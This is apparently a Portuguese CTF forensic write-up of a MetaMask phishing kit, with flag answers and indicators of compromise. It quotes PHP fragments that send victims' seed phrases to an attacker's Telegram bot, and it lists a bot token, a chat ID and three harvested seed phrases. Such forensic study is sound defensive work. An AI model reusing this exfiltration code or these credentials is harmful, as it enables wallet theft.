# 🔍 GrabThePhisher — CTF Writeup
### CyberDefenders Blue Team Challenge | Análise Forense de Kit de Phishing (MetaMask / Telegram Bot)

---

| **Analista**          | Mauricio Robert                                                                     |
|-----------------------|-------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                   |
| **Data do Relatório** | 23/06/2026                                                                          |
| **Data do Incidente** | 23/06/2026 (fonte: GrabThePhisher — CyberDefenders)                               |
| **Classificação**     | CONFIDENCIAL                                                                        |
| **Ferramentas**       | Autopsy 4.23.1                                                                      |
| **Arquivo**           | Sistema de arquivos extraído — servidor web comprometido (`pankewk/`)              |

---

## 🔍 Resumo Executivo

A análise forense do desafio **GrabThePhisher** (CyberDefenders Blue Team) examinou, por meio do **Autopsy 4.23.1**, o sistema de arquivos extraído de um servidor web comprometido que hospedava um kit de phishing direcionado a usuários de carteiras de criptomoedas. O kit consiste em uma réplica fiel da interface da **MetaMask** (`index.html`) servida por um backend **PHP** (`metamask.php`) que, ao receber a *seed phrase* da vítima, enriquece os dados com geolocalização via **Sypex Geo** e exfiltra imediatamente as informações para um **bot do Telegram** controlado pelo atacante — além de gravar as frases localmente em `log.txt` como backup. Ao momento da análise, **três vítimas** já haviam sido comprometidas. A investigação respondeu a **dez questões técnicas** com base em evidências extraídas diretamente do sistema de arquivos.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta           | Finalidade                                                                                                          |
|----------------------|---------------------------------------------------------------------------------------------------------------------|
| **Autopsy 4.23.1**   | Análise forense do sistema de arquivos — navegação por diretórios, extração de texto de arquivos PHP/HTML, inspeção de hashes MD5/SHA-256 e leitura de logs |

---

## 📋 Perguntas e Respostas

### Q1 — Qual carteira é usada para solicitar a seed phrase?

> **Resposta: `MetaMask`**

**Solução:** A análise do arquivo `index.html` localizado em `/LogicalFileSet1/pankewk/metamask/` revelou uma página de phishing aberta localmente no browser do analista (`C:/Users/ForenseAnalyst/.../pankewk/metamask/index.html`). A interface apresenta o **logotipo oficial da MetaMask**, o cabeçalho "Continue with Seed Phrase" e um campo "Wallet Seed" com placeholder "Separate each word with a single space", seguido do botão "Proceed" — replicando fielmente a identidade visual da extensão MetaMask da rede Ethereum MainNet para enganar usuários e induzi-los a digitar suas 12 palavras da frase-semente.

![Carteira](/Forensic/GrabThePhisher/images/Wallet_Used_for_First_Phrase(1).png)

---

### Q2 — Qual é o nome do arquivo que contém o código do kit de phishing?

> **Resposta: `metamask.php`**

**Solução:** A navegação pelo diretório `/LogicalFileSet1/pankewk/metamask/` no Autopsy (aba *Table*) listou quatro itens:

```
metamask.php    1188 bytes   MD5: a1f9c43108af859db3091d11cc34a045
                             SHA-256: f73c827c0d7aea6ac20e3e2c7e753df6124840b1b07...
index.html    839192 bytes   SHA-256: c1b27b92c2eec043a3079a41e5e4302c...
fonts/          (pasta)
.DS_Store       6148 bytes
```

O arquivo **`metamask.php`** (1188 bytes) é o backend responsável por processar as seed phrases submetidas pelas vítimas, consultar a API de geolocalização, formatar a mensagem e executar a exfiltração via Telegram Bot API.

![Aquivo Malicioso](/Forensic/GrabThePhisher/images/Archive_Content_Phising_Code(2).png)

---

### Q3 — Em qual linguagem o kit foi escrito?

> **Resposta: `PHP`**

**Solução:** O conteúdo extraído de `metamask.php` (aba *Text* do Autopsy) começa com o marcador de abertura:

```php
<?php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);
$array = json_decode($request);
...
```

O cabeçalho `<?php` identifica inequivocamente a linguagem **PHP**. Todo o código backend — requisição de geolocalização, construção da mensagem, envio via Telegram Bot API e gravação no log — está implementado em PHP puro, linguagem amplamente suportada em servidores web compartilhados de baixo custo, o que facilita a distribuição e hospedagem de kits de phishing.

![Linguagem de Programação](/Forensic/GrabThePhisher/images/Language_Write_Code(3).png)

---

### Q4 — Qual serviço o kit usa para recuperar informações da máquina da vítima?

> **Resposta: `Sypex Geo`**

**Solução:** A primeira linha executável de `metamask.php` realiza a chamada:

```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
```

O serviço **Sypex Geo** (`api.sypexgeo.net`) é uma API de geolocalização por IP que retorna dados em JSON. O kit extrai o **país** (`$geo`), a **cidade** (`$city`) e a **data/hora** (`$date = date('m.d.Y')`) para compor a mensagem de notificação enviada ao atacante via Telegram — enriquecendo cada registro com contexto geográfico da vítima.

![API de Extrafilacao](/Forensic/GrabThePhisher/images/Service_Kit_Used_for_Retrive_Information(4).png)

---

### Q5 — Quantas seed phrases já foram coletadas?

> **Resposta: `3`**

**Solução:** A navegação até `/LogicalFileSet1/pankewk/log/` no Autopsy revelou o arquivo `log.txt` (250 bytes). O conteúdo extraído lista exatamente **três linhas** de seed phrases BIP-39:

```
number edge rebuild stomach review course sphere absurd memory among drastic total
bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

O código PHP registra cada nova seed phrase com `file_put_contents(..., FILE_APPEND)`, adicionando sequencialmente as entradas ao arquivo — confirmando **3 vítimas comprometidas** ao momento da análise.

![Quantas Frases Foram Coletadas](/Forensic/GrabThePhisher/images/3_Phrases_Coleted(5).png)

---

### Q6 — Qual é a seed phrase associada ao incidente de phishing mais recente?

> **Resposta: `father also recycle embody balance concert mechanic believe owner pair muffin hockey`**

**Solução:** Como o código PHP utiliza `FILE_APPEND` para gravar no `log.txt`, as entradas são registradas em **ordem cronológica crescente** — a última linha corresponde à vítima mais recente. A terceira e última linha do arquivo, destacada em azul no Autopsy:

```
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

é a seed phrase da **vítima mais recente**. Qualquer pessoa de posse dessas 12 palavras pode importar a carteira comprometida em qualquer cliente compatível com BIP-39 e drenar imediatamente todos os fundos.

![Frase Mais Recente](/Forensic/GrabThePhisher/images/Phrase_Most_Recent(6).png)

---

### Q7 — Qual meio foi utilizado para o dump de credenciais?

> **Resposta: `Telegram`**

**Solução:** O código de `metamask.php` implementa a função `sendTelSmessage()`, que constrói e executa a seguinte requisição HTTP:

```php
$filename = "https://api.telegram.org/bot".$token."/sendMessage
             ?chat_id=".$id.
             "&text=".urlencode($smessage).
             "&parse_mode=html";
file_get_contents($filename);
```

Cada seed phrase submetida é formatada em HTML e enviada via HTTP GET para a **Telegram Bot API**, utilizando o bot do atacante como canal de exfiltração em tempo real. Adicionalmente, a phrase é gravada localmente no `log.txt` como backup offline.

![API de Dump](/Forensic/GrabThePhisher/images/Dump_Credentials(7).png)

---

### Q8 — Qual é o token para acesso ao canal?

> **Resposta: `5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10`**

**Solução:** A inspeção de `metamask.php` no Autopsy (aba *Text*, 10:13 PM) revelou, dentro da função `sendTelSmessage()`, a linha com o token destacada:

```php
$token = "5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10";
```

Este é o **token de autenticação do Telegram Bot** que autoriza o script PHP a enviar mensagens em nome do bot controlado pelo atacante. A estrutura `<bot_id>:<secret_key>` é padrão da Telegram Bot API — o prefixo numérico `5457463144` é o ID do bot, e a sequência alfanumérica após os dois-pontos é a chave secreta gerada pelo BotFather.

![Token de Acesso](/Forensic/GrabThePhisher/images/Token_for_Access_Channel(8).png)

---

### Q9 — Qual é o Chat ID do canal do phisher?

> **Resposta: `5442785564`**

**Solução:** No mesmo bloco da função `sendTelSmessage()` de `metamask.php`, a linha com o Chat ID foi destacada:

```php
$id = 5442785564;
```

Este identificador numérico representa o **chat ou canal do Telegram** do atacante para onde todas as seed phrases capturadas são enviadas. Combinado com o token (`5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10`), identifica unicamente o destino de exfiltração e permite o rastreamento do canal na plataforma.

![Chat ID](/Forensic/GrabThePhisher/images/Chat_ID(9).png)

---

### Q10 — Quais são os aliados do desenvolvedor do kit de phishing?

> **Resposta: `j1j1b1s@m3l0`**

**Solução:** O conteúdo de `metamask.php` contém um comentário de autoria embutido pelo próprio desenvolvedor do kit, revelando um alias associado:

```
This is a small gift to my brothers,
All the best with your luck,
Regards,
j1j1b1s@m3l0
```

O handle **`j1j1b1s@m3l0`** foi destacado no Autopsy (aba *Text*, 10:15 PM). Esse alias aparece na seção de agradecimentos/créditos do código, sugerindo tratar-se de um colaborador ou aliado do desenvolvedor dentro do ecossistema de distribuição de kits de phishing. Esse tipo de referência em código malicioso é comum em phishing kits distribuídos em fóruns underground.

![Aliados do Desenvolvedor](/Forensic/GrabThePhisher/images/Allies_of_Kit_Developer(10).png)

---

## ⛓ Fluxo do Ataque (Kill Chain)

```
[FASE 1 — ENGENHARIA SOCIAL]
    Vítima recebe link para http://<servidor>/pankewk/metamask/index.html
    Página falsa da MetaMask solicita "Continue with Seed Phrase"
    Vítima digita as 12 palavras da seed phrase e clica em "Proceed"
    ↓
[FASE 2 — CAPTURA & ENRIQUECIMENTO (metamask.php)]
    $_POST['data'] recebe a seed phrase
    Consulta: http://api.sypexgeo.net/json/<IP_da_vitima>
    Dados coletados: IP, país, cidade, data/hora
    ↓
[FASE 3 — EXFILTRAÇÃO VIA TELEGRAM]
    Mensagem HTML formatada:
        Wallet: MetaMask
        Phrase: <seed phrase>
        IP: <ip> | geo: <country> | <city>
        User: <HTTP_USER_AGENT>
    Enviada para: api.telegram.org/bot5457463144:AAG8.../sendMessage
    chat_id: 5442785564
    ↓
[FASE 4 — BACKUP LOCAL]
    file_put_contents(.../log/log.txt, $seed_phrase."\n", FILE_APPEND)
    Seed phrase gravada em /pankewk/log/log.txt
    ↓
[RESULTADO — 3 VÍTIMAS COMPROMETIDAS]
    Seed phrase 1: number edge rebuild stomach... (acesso total à carteira 1)
    Seed phrase 2: bomb stairs satisfy host...    (acesso total à carteira 2)
    Seed phrase 3: father also recycle embody...  (acesso total à carteira 3 — mais recente)
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| Carteira usada no phishing | Browser → `index.html` local | Interface MetaMask falsa (logo + campo "Wallet Seed") |
| Arquivo do kit | Autopsy → `/pankewk/metamask/` (aba *Table*) | `metamask.php` (1188 bytes) |
| Linguagem do kit | Autopsy → `metamask.php` aba *Text* | Cabeçalho `<?php` |
| Serviço de geolocalização | Autopsy → `metamask.php` linha 2 | `api.sypexgeo.net` (Sypex Geo) |
| Quantidade de vítimas | Autopsy → `/pankewk/log/log.txt` | 3 linhas de seed phrases |
| Seed phrase mais recente | Autopsy → `log.txt` (última linha) | `father also recycle embody balance concert mechanic believe owner pair muffin hockey` |
| Canal de exfiltração | Autopsy → `metamask.php` (função `sendTelSmessage`) | Telegram Bot API (`api.telegram.org`) |
| Token do bot | Autopsy → `metamask.php` (`$token =`) | `5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10` |
| Chat ID do atacante | Autopsy → `metamask.php` (`$id =`) | `5442785564` |
| Aliados do desenvolvedor | Autopsy → `metamask.php` (comentário de autoria) | `j1j1b1s@m3l0` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Kit de phishing | `metamask.php` | Backend PHP do kit — MD5: `a1f9c43108af859db3091d11cc34a045` |
| Página de phishing | `index.html` (MetaMask) | Interface falsa de captura de seed phrase — 839192 bytes |
| Linguagem | PHP | Cabeçalho `<?php` em `metamask.php` |
| API de geolocalização | `api.sypexgeo.net` (Sypex Geo) | Coleta país, cidade e IP da vítima |
| Canal de exfiltração | Telegram Bot API (`api.telegram.org`) | Envio imediato de cada seed phrase ao atacante |
| Token do bot Telegram | `5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10` | Autenticação do bot do atacante |
| Chat ID | `5442785564` | Destino das seed phrases exfiltradas |
| Log de credenciais | `/pankewk/log/log.txt` (250 bytes) | 3 seed phrases capturadas |
| Seed phrase recente | `father also recycle embody balance concert mechanic believe owner pair muffin hockey` | Última entrada do `log.txt` — vítima mais recente |
| Alias do autor | `j1j1b1s@m3l0` | Comentário embutido em `metamask.php` — aliados do desenvolvedor |
| Técnica (MITRE ATT&CK) | `T1566` | Phishing |
| Técnica (MITRE ATT&CK) | `T1567` | Exfiltration Over Web Service (Telegram Bot API) |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | Carteira usada para solicitar a seed phrase | `MetaMask` |
| Q2 | Nome do arquivo do kit de phishing | `metamask.php` |
| Q3 | Linguagem em que o kit foi escrito | `PHP` |
| Q4 | Serviço para recuperar informações da vítima | `Sypex Geo` |
| Q5 | Quantidade de seed phrases coletadas | `3` |
| Q6 | Seed phrase do incidente mais recente | `father also recycle embody balance concert mechanic believe owner pair muffin hockey` |
| Q7 | Meio utilizado para dump de credenciais | `Telegram` |
| Q8 | Token de acesso ao canal | `5457463144:AAG8t4k7eZew3kTi0B5hcWbSia0Inxm10` |
| Q9 | Chat ID do canal do phisher | `5442785564` |
| Q10 | Aliados do desenvolvedor do kit | `j1j1b1s@m3l0` |

---

## 📚 Referências

- [CyberDefenders — GrabThePhisher CTF](https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/)
- [Autopsy Digital Forensics Platform](https://www.autopsy.com/)
- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [Sypex Geo API](https://sypexgeo.net/en/docs/)
- [MITRE ATT&CK T1566 — Phishing](https://attack.mitre.org/techniques/T1566/)
- [MITRE ATT&CK T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)
- [MetaMask Security](https://metamask.io/security/)

---